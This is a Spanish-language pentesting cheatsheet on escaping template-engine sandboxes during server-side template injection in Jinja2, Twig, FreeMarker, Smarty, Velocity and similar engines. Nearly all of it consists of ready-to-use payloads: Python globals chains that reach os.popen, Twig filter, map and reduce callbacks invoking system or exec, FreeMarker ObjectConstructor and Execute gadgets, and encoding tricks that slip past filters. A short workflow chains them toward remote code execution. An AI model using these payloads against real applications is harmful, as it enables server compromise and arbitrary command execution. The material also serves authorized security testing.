---
aliases:
  - SSTI Sandbox Bypass
  - Jinja2 Sandbox Escape
  - Twig Sandbox Bypass
tags:
  - type/cheatsheet
  - vuln/ssti
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Server-Side Template Injection (SSTI)]]'
---
# SSTI - Sandbox Escape

***

## Jinja2 Sandbox Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `{{lipsum.__globals__.os.popen('id').read()}}` | RCE via helper Flask `lipsum` | SandboxedEnvironment con lipsum no filtrado. |
| Bypass via `cycler` | `{{cycler.__init__.__globals__.os.popen('id').read()}}` | Helper Jinja2. |
| Bypass via `joiner` | `{{joiner.__init__.__globals__.os.popen('id').read()}}` | Helper Jinja2. |
| Bypass via `namespace` | `{{namespace.__init__.__globals__.os.popen('id').read()}}` | Helper Jinja2. |
| Bypass via attribute access notation | `{{request['__class__']['__init__']['__globals__']['os'].popen('id').read()}}` | Bracket en lugar de dot — algunos sandboxes filtran solo `.`. |
| Bypass via `getattr` | `{{(()|attr('__class__')|attr('__bases__')|attr('__getitem__')(0)|attr('__subclasses__')())}}` | Filter chain. |
| Bypass via `|attr` filter | `{{ ()|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fmro\x5f\x5f") }}` | Hex escapes para bloqueado `__`. |
| Bypass via `|format` | `{{ "%c%c%c%c%c%c%c%c%c%c%c"|format(95,95,99,108,97,115,115,95,95,...) }}` | Construir `__class__` por chars. |
| Bypass via `|join` | `{{ ['__cl','ass__']|join }}` | String concat. |
| Bypass UnicodeStringClass | `{{ x.__class__ }}` con `x="abc"` | Si filter bloquea acceso desde literales. |
| Force `_*` filter bypass | `{{ ''[request.args.cls][...]... }}` | URL params como input. |
^ssti-sandbox-jinja2

### Workflow bypass Jinja2

```
1. Confirmar sandbox: {{config}} → si retorna `<class 'flask.Config'>` o `Forbidden`, sandbox activo.
2. Probar atributos no bloqueados: lipsum, cycler, joiner, request.
3. Si todos bloqueados: usar attr() filter con strings dinámicas.
4. Encadenar hasta __globals__ → os → popen → read.
```

___

## Twig Sandbox Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `{{['id']\|filter('system')}}` | RCE via filter callback | Twig sandbox con filter() permitido. |
| Bypass via `map` | `{{['id']\|map('passthru')\|join('')}}` | Map igual. |
| Bypass via `sort` | `{{[1,2]\|sort('exec')}}` | Sort callback. |
| Bypass via `reduce` | `{{[1,2]\|reduce('system','id')}}` | Reduce callback. |
| Bypass via `_self` | `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}` | Acceso al env de Twig — clásico Twig 1.x. |
| Bypass via `getName` | `{{_self.getName()}}` | Disclosure template name. |
| Bypass `getTemplateClass` | `{{_self.env.getTemplateClass('file.twig')}}` | Class name leak. |
| Bypass via `loadTemplate` | `{{_self.env.loadTemplate('file.twig')}}` | Load + render arbitrary template. |
| Bypass `compileSource` | `{{_self.env.compileSource('{{system(\"id\")}}','test')}}` | Compile arbitrary template source. |
| Twig 2/3 con `setSafeMode` | Más estricto — necesita gadget Symfony específico | Lookup CVE-2018-19360 etc. |
^ssti-sandbox-twig

___

## FreeMarker Security Manager Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<#assign x="freemarker.template.utility.ObjectConstructor"?new()> ${x("java.util.Hashtable")}` | Bypass SAFER_RESOLVER via ObjectConstructor | ObjectConstructor permitido. |
| Bypass via JythonRuntime | `<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>...</@value>` | Si Jython en classpath. |
| ALLOWS_NOTHING_RESOLVER bypass | Si resolver bloquea `?new()` totalmente | Buscar gadget en context expuesto. |
| Bypass via reflection | `${"".class.forName("java.lang.Runtime").getMethod("exec",...)}` | Si ClassResolver permite class lookup. |
| Bypass FreeMarker 2.3.30+ | Default resolver más estricto | Combinar con CVE específicos del lib version. |
| Bypass via static fields | `${className?api.protectionDomain.codeSource.location}` | Disclosure paths. |
| Combine con setting expose | `<#setting locale="...">` con valores que rompen sandbox | Edge case. |
^ssti-sandbox-freemarker

___

## Filter Abuse para Escape

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `{{value\|filter('callback')}}` | Twig — invocar callback custom | Filter() en sandbox acepta callable. |
| Pattern Jinja2 attr | `{{value\|attr('method_name')}}` | Acceso indirecto. |
| Pattern Liquid | `{{value\|filter_name: arg}}` | Si filter custom inseguro. |
| Pattern Velocity | `$value.method($args)` | Method invocation. |
| Pattern FreeMarker `?eval` | `${"<malicious>"?eval}` | Eval string como template. |
| Pattern FreeMarker `?interpret` | `<@"<malicious>"?interpret/>` | Interpret string. |
| Pattern Smarty `\|cat` chain | `{$x\|cat:"`id`"}` | Concatenation con backticks PHP. |
| Pattern ERB `<%=` reflejado | Si app pasa user input a `<%= %>` | RCE inmediato. |
| Bypass via JS in template | Engines JS-based: pasar `Function('return process')()` | Node.js context. |
| Bypass `?new` con string concat | `<#assign cls="freemarker.template.utility."+"Execute"?new()>` | Si filtro busca string literal. |
^ssti-sandbox-filter-abuse

***
